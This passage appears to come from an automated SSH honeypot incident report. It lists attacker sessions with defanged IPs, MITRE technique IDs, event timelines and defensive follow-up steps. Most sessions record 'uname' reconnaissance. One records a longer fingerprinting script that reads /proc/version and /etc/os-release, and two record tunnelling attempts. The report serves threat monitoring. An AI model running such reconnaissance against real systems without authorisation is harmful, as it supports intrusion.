**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:12` | `cowrie.session.connect` |
| `2026-08-15 20:13:12` | `cowrie.client.version` |
| `2026-08-15 20:13:12` | `cowrie.client.kex` |
| `2026-08-15 20:13:12` | `cowrie.login.success` |
| `2026-08-15 20:13:13` | `cowrie.session.params` |
| `2026-08-15 20:13:13` | `cowrie.command.input` |
| `2026-08-15 20:13:13` | `cowrie.log.closed` |
| `2026-08-15 20:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6b9b2a61c07

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:17` | `cowrie.session.connect` |
| `2026-08-15 20:13:17` | `cowrie.client.version` |
| `2026-08-15 20:13:17` | `cowrie.client.kex` |
| `2026-08-15 20:13:18` | `cowrie.login.success` |
| `2026-08-15 20:13:19` | `cowrie.session.params` |
| `2026-08-15 20:13:19` | `cowrie.command.input` |
| `2026-08-15 20:13:19` | `cowrie.log.closed` |
| `2026-08-15 20:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e33da1673b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:22` | `cowrie.session.connect` |
| `2026-08-15 20:13:22` | `cowrie.client.version` |
| `2026-08-15 20:13:22` | `cowrie.client.kex` |
| `2026-08-15 20:13:22` | `cowrie.login.success` |
| `2026-08-15 20:13:23` | `cowrie.session.params` |
| `2026-08-15 20:13:23` | `cowrie.command.input` |
| `2026-08-15 20:13:24` | `cowrie.log.closed` |
| `2026-08-15 20:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2266c70fc2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:22` | `cowrie.session.connect` |
| `2026-08-15 20:13:23` | `cowrie.client.version` |
| `2026-08-15 20:13:23` | `cowrie.client.kex` |
| `2026-08-15 20:13:27` | `cowrie.login.success` |
| `2026-08-15 20:13:30` | `cowrie.session.params` |
| `2026-08-15 20:13:30` | `cowrie.command.input` |
| `2026-08-15 20:13:30` | `cowrie.command.input` |
| `2026-08-15 20:13:30` | `cowrie.command.input` |
| `2026-08-15 20:13:30` | `cowrie.command.input` |
| `2026-08-15 20:13:30` | `cowrie.command.input` |
| `2026-08-15 20:13:30` | `cowrie.command.success` |
| `2026-08-15 20:13:30` | `cowrie.command.input` |
| `2026-08-15 20:13:30` | `cowrie.command.input` |
| `2026-08-15 20:13:30` | `cowrie.command.input` |
| `2026-08-15 20:13:30` | `cowrie.command.input` |
| `2026-08-15 20:13:30` | `cowrie.log.closed` |
| `2026-08-15 20:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b2fd23c9bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:27` | `cowrie.session.connect` |
| `2026-08-15 20:13:27` | `cowrie.client.version` |
| `2026-08-15 20:13:27` | `cowrie.client.kex` |
| `2026-08-15 20:13:27` | `cowrie.login.success` |
| `2026-08-15 20:13:28` | `cowrie.session.params` |
| `2026-08-15 20:13:28` | `cowrie.command.input` |
| `2026-08-15 20:13:28` | `cowrie.log.closed` |
| `2026-08-15 20:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67323ad58b95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:32` | `cowrie.session.connect` |
| `2026-08-15 20:13:32` | `cowrie.client.version` |
| `2026-08-15 20:13:32` | `cowrie.client.kex` |
| `2026-08-15 20:13:32` | `cowrie.login.success` |
| `2026-08-15 20:13:33` | `cowrie.session.params` |
| `2026-08-15 20:13:33` | `cowrie.command.input` |
| `2026-08-15 20:13:33` | `cowrie.log.closed` |
| `2026-08-15 20:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33ebfb3cb7b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:37` | `cowrie.session.connect` |
| `2026-08-15 20:13:37` | `cowrie.client.version` |
| `2026-08-15 20:13:37` | `cowrie.client.kex` |
| `2026-08-15 20:13:38` | `cowrie.login.success` |
| `2026-08-15 20:13:38` | `cowrie.session.params` |
| `2026-08-15 20:13:38` | `cowrie.command.input` |
| `2026-08-15 20:13:38` | `cowrie.log.closed` |
| `2026-08-15 20:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-162a7222eb3d

| Field | Detail |
|---|---|
| **Source IP** | `103.29.185[.]162` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:39` | `cowrie.session.connect` |
| `2026-08-15 20:13:41` | `cowrie.client.version` |
| `2026-08-15 20:13:41` | `cowrie.client.kex` |
| `2026-08-15 20:13:47` | `cowrie.login.success` |
| `2026-08-15 20:13:49` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.29.185[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.29.185[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d98a250730

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:42` | `cowrie.session.connect` |
| `2026-08-15 20:13:42` | `cowrie.client.version` |
| `2026-08-15 20:13:42` | `cowrie.client.kex` |
| `2026-08-15 20:13:42` | `cowrie.login.success` |
| `2026-08-15 20:13:43` | `cowrie.session.params` |
| `2026-08-15 20:13:43` | `cowrie.command.input` |
| `2026-08-15 20:13:43` | `cowrie.log.closed` |
| `2026-08-15 20:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8487e65551c9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:47` | `cowrie.session.connect` |
| `2026-08-15 20:13:47` | `cowrie.client.version` |
| `2026-08-15 20:13:47` | `cowrie.client.kex` |
| `2026-08-15 20:13:48` | `cowrie.login.success` |
| `2026-08-15 20:13:49` | `cowrie.session.params` |
| `2026-08-15 20:13:49` | `cowrie.command.input` |
| `2026-08-15 20:13:49` | `cowrie.log.closed` |
| `2026-08-15 20:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d50f60bf0858

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:52` | `cowrie.session.connect` |
| `2026-08-15 20:13:52` | `cowrie.client.version` |
| `2026-08-15 20:13:52` | `cowrie.client.kex` |
| `2026-08-15 20:13:53` | `cowrie.login.success` |
| `2026-08-15 20:13:54` | `cowrie.session.params` |
| `2026-08-15 20:13:54` | `cowrie.command.input` |
| `2026-08-15 20:13:54` | `cowrie.log.closed` |
| `2026-08-15 20:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5272beadd1eb

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:54` | `cowrie.session.connect` |
| `2026-08-15 20:13:55` | `cowrie.client.version` |
| `2026-08-15 20:13:55` | `cowrie.client.kex` |
| `2026-08-15 20:13:57` | `cowrie.login.success` |
| `2026-08-15 20:13:57` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03cd3c12c43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:57` | `cowrie.session.connect` |
| `2026-08-15 20:13:57` | `cowrie.client.version` |
| `2026-08-15 20:13:57` | `cowrie.client.kex` |
| `2026-08-15 20:13:58` | `cowrie.login.success` |
| `2026-08-15 20:13:59` | `cowrie.session.params` |
| `2026-08-15 20:13:59` | `cowrie.command.input` |
| `2026-08-15 20:13:59` | `cowrie.log.closed` |
| `2026-08-15 20:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76beea878700

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:03` | `cowrie.session.connect` |
| `2026-08-15 20:14:03` | `cowrie.client.version` |
| `2026-08-15 20:14:03` | `cowrie.client.kex` |
| `2026-08-15 20:14:04` | `cowrie.login.success` |
| `2026-08-15 20:14:05` | `cowrie.session.params` |
| `2026-08-15 20:14:05` | `cowrie.command.input` |
| `2026-08-15 20:14:05` | `cowrie.log.closed` |
| `2026-08-15 20:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f98d370197a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:08` | `cowrie.session.connect` |
| `2026-08-15 20:14:08` | `cowrie.client.version` |
| `2026-08-15 20:14:09` | `cowrie.client.kex` |
| `2026-08-15 20:14:09` | `cowrie.login.success` |
| `2026-08-15 20:14:10` | `cowrie.session.params` |
| `2026-08-15 20:14:10` | `cowrie.command.input` |
| `2026-08-15 20:14:10` | `cowrie.log.closed` |
| `2026-08-15 20:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4448e4d5e635

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:14` | `cowrie.session.connect` |
| `2026-08-15 20:14:14` | `cowrie.client.version` |
| `2026-08-15 20:14:14` | `cowrie.client.kex` |
| `2026-08-15 20:14:15` | `cowrie.login.success` |
| `2026-08-15 20:14:16` | `cowrie.session.params` |
| `2026-08-15 20:14:16` | `cowrie.command.input` |
| `2026-08-15 20:14:16` | `cowrie.log.closed` |
| `2026-08-15 20:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d2f2e891123

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:19` | `cowrie.session.connect` |
| `2026-08-15 20:14:19` | `cowrie.client.version` |
| `2026-08-15 20:14:19` | `cowrie.client.kex` |
| `2026-08-15 20:14:20` | `cowrie.login.success` |
| `2026-08-15 20:14:21` | `cowrie.session.params` |
| `2026-08-15 20:14:21` | `cowrie.command.input` |
| `2026-08-15 20:14:21` | `cowrie.log.closed` |
| `2026-08-15 20:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18b231021bfc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:24` | `cowrie.session.connect` |
| `2026-08-15 20:14:24` | `cowrie.client.version` |
| `2026-08-15 20:14:24` | `cowrie.client.kex` |
| `2026-08-15 20:14:25` | `cowrie.login.success` |
| `2026-08-15 20:14:26` | `cowrie.session.params` |
| `2026-08-15 20:14:26` | `cowrie.command.input` |
| `2026-08-15 20:14:26` | `cowrie.log.closed` |
| `2026-08-15 20:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddfc5dc6b376

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:29` | `cowrie.session.connect` |
| `2026-08-15 20:14:29` | `cowrie.client.version` |
| `2026-08-15 20:14:30` | `cowrie.client.kex` |
| `2026-08-15 20:14:30` | `cowrie.login.success` |
| `2026-08-15 20:14:31` | `cowrie.session.params` |
| `2026-08-15 20:14:31` | `cowrie.command.input` |
| `2026-08-15 20:14:31` | `cowrie.log.closed` |
| `2026-08-15 20:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45569e270ebc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:35` | `cowrie.session.connect` |
| `2026-08-15 20:14:35` | `cowrie.client.version` |
| `2026-08-15 20:14:35` | `cowrie.client.kex` |
| `2026-08-15 20:14:35` | `cowrie.login.success` |
| `2026-08-15 20:14:36` | `cowrie.session.params` |
| `2026-08-15 20:14:36` | `cowrie.command.input` |
| `2026-08-15 20:14:36` | `cowrie.log.closed` |
| `2026-08-15 20:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98a46f41cb26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:40` | `cowrie.session.connect` |
| `2026-08-15 20:14:40` | `cowrie.client.version` |
| `2026-08-15 20:14:40` | `cowrie.client.kex` |
| `2026-08-15 20:14:41` | `cowrie.login.success` |
| `2026-08-15 20:14:42` | `cowrie.session.params` |
| `2026-08-15 20:14:42` | `cowrie.command.input` |
| `2026-08-15 20:14:43` | `cowrie.log.closed` |
| `2026-08-15 20:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-942d282e062d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:45` | `cowrie.session.connect` |
| `2026-08-15 20:14:45` | `cowrie.client.version` |
| `2026-08-15 20:14:45` | `cowrie.client.kex` |
| `2026-08-15 20:14:46` | `cowrie.login.success` |
| `2026-08-15 20:14:47` | `cowrie.session.params` |
| `2026-08-15 20:14:47` | `cowrie.command.input` |
| `2026-08-15 20:14:47` | `cowrie.log.closed` |
| `2026-08-15 20:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1b7bd9eac5c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:50` | `cowrie.session.connect` |
| `2026-08-15 20:14:50` | `cowrie.client.version` |
| `2026-08-15 20:14:50` | `cowrie.client.kex` |
| `2026-08-15 20:14:51` | `cowrie.login.success` |
| `2026-08-15 20:14:52` | `cowrie.session.params` |
| `2026-08-15 20:14:52` | `cowrie.command.input` |
| `2026-08-15 20:14:52` | `cowrie.log.closed` |
| `2026-08-15 20:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ebeebf52d36

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:14 |
| **Last Seen** | 2026-08-15 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:14:56` | `cowrie.session.connect` |
| `2026-08-15 20:14:56` | `cowrie.client.version` |
| `2026-08-15 20:14:56` | `cowrie.client.kex` |
| `2026-08-15 20:14:56` | `cowrie.login.success` |
| `2026-08-15 20:14:57` | `cowrie.session.params` |
| `2026-08-15 20:14:57` | `cowrie.command.input` |
| `2026-08-15 20:14:57` | `cowrie.log.closed` |
| `2026-08-15 20:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adc2f3971c84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:01` | `cowrie.session.connect` |
| `2026-08-15 20:15:01` | `cowrie.client.version` |
| `2026-08-15 20:15:01` | `cowrie.client.kex` |
| `2026-08-15 20:15:02` | `cowrie.login.success` |
| `2026-08-15 20:15:02` | `cowrie.session.params` |
| `2026-08-15 20:15:02` | `cowrie.command.input` |
| `2026-08-15 20:15:03` | `cowrie.log.closed` |
| `2026-08-15 20:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
